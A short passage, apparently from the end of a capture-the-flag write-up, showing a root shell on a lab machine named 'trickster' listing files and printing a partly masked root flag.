changedetection  root.txt  scripts  snap
root@trickster:~# cat root.txt
344be4e91e0---------------------
```
